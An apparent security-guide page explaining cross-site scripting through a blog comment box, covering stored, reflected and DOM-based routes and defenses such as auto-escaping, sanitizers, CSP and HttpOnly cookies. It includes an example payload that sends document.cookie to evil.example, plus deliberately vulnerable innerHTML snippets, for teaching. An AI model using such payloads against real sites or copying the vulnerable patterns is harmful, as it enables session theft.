---
title: Cross-Site Scripting (XSS)
summary: Attacker-controlled text becomes JavaScript running in another user's browser unless it is encoded for the place it lands, so let the framework encode and treat everything else as a backstop.
date: 2026-09-14
---

Picture a blog with a comment box. A visitor types a comment, your server stores it, and every later reader sees it under the post. What happens if the comment is not text, but code?

That is cross-site scripting (XSS): an attacker gets their own JavaScript to run in another user's browser, with the privileges of your site. It is [SQL injection](/security/sql-injection)'s sibling on the front end. SQL injection smuggles code into a query; XSS smuggles it into a page. In both, untrusted input is mixed into something a parser will interpret, and the parser cannot tell the data from the instructions.

This page covers how a comment becomes code, what that code can do, why the obvious fix fails, the fix that works, where XSS creeps back in, how else a payload reaches the page, and the layers to add in case one slips.

## How does a comment become code?

Here is the blog's rendering code, with the mistake in it:

```js
// vulnerable: the comment is parsed as HTML, not shown as text
container.innerHTML = `<p>${comment}</p>`;
```

Suppose the comment is `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`. The browser parses it as an image tag, the image fails to load (there is no image at `x`), and the `onerror` handler runs. That code now executes for everyone who opens the post.

## What can the attacker do from there?

The browser lets a page's scripts touch only data from the same scheme, host and port as the page. That combination is called an **origin**, and [Same-Origin Policy and CORS](/security/same-origin-policy-and-cors) covers the rule. The injected script came inside your page, so it runs in your blog's origin, with every right your own script has.

It can send requests to your server as the logged-in reader. It can often read the reader's login cookie (the small value the browser stores and sends back with each request to prove who they are), unless the site hides it from scripts (the last section shows how). It can also read a token your page saved in `localStorage` (browser storage that any script on the page can read). It can record keystrokes, or rewrite the page to show a fake login form. The reader never did anything wrong except open a post.

So the comment must never run. The first fix anyone suggests is to remove `<script>` from comments.

## Why not strip out `<script>`?

Because the attack above never used it. Event handlers like `onerror`, `javascript:` URLs and odd encodings all run code, and attackers keep finding new ones. A blocklist chases the attacker, who only has to find the one pattern you missed. Something sturdier has to remove the problem instead.

## What is the fix?

Encode data for the place it is going. A comment inside an HTML body needs `<` turned into `&lt;`, so the browser shows a bracket instead of opening a tag. The payload above then appears on the page as harmless visible text.

A value inside an HTML attribute, a JavaScript string or a URL each needs different escaping, which is why hand-rolled filters fail. So don't encode by hand: use a templating layer that escapes automatically and let it build the page.

```jsx
// safe: React escapes the string, so "<img ...>" shows up as visible text
<p>{comment}</p>

// vulnerable: this opts out of the escaping
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

React escapes anything you interpolate into markup. So the blog is safe until someone reaches for an escape hatch.

## Where does XSS creep back in?

You get XSS back through `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `document.write`, or a URL you did not check (a link whose `href` begins with `javascript:` runs code when clicked). Search your codebase for those names and you have found the client-side places worth reviewing.

Now the blog's owner wants comments with bold and italics, so some HTML must be allowed and escaping everything is out. Run the comment through a maintained **sanitizer**, a library that parses the HTML and keeps only an allowlist of safe tags and attributes. Do not write that filter yourself, for the same reason as before.

That secures the comment box. But the comment box is only one way in.

## How else does a payload reach the page?

The blog can suffer three routes, and the same fix covers each:

- **Stored.** The payload is saved, as in the comment above, and served to every viewer. One submission reaches everyone, which makes it the most damaging kind.
- **Reflected.** The payload travels in the request and is echoed straight into the response. If the blog's search page prints "No results for ..." using the `?q=` parameter, an attacker can email a victim a link with the payload in `q`. The victim's browser requests it, the server writes the parameter into the page, and the browser runs it.
- **DOM-based.** The server is innocent. Client-side script reads attacker-controlled input, such as `location.hash` (the part of the URL after `#`) or a `postMessage` payload (a message another window sends the page), and writes it into the page itself.

Each route ends the same way: untrusted input written into the page without encoding, whether by a server template or a client-side sink like the hatches above. But escaping only has to be missed once, in one template, for a hole to open.

## What if one slips through anyway?

Add layers. A **Content-Security-Policy** (CSP) is a response header telling the browser which script sources it may run. A policy that bans inline scripts and unknown origins would have stopped the `onerror` payload.

Marking the session cookie `HttpOnly` hides it from JavaScript, so a successful XSS cannot steal it. The script can still send requests as the user while the page is open, so `HttpOnly` limits the damage and does not prevent the attack. The same reasoning is behind the advice in [JSON Web Tokens](/security/jwt) to avoid keeping long-lived tokens in storage that scripts can read.

**Rule of thumb.** Treat every string that did not come from your own code as hostile, including display names, error messages and URL parameters. Let an auto-escaping framework encode it for where it lands, sanitize with a library when you must allow HTML, and keep a CSP and `HttpOnly` cookies as the backstop.
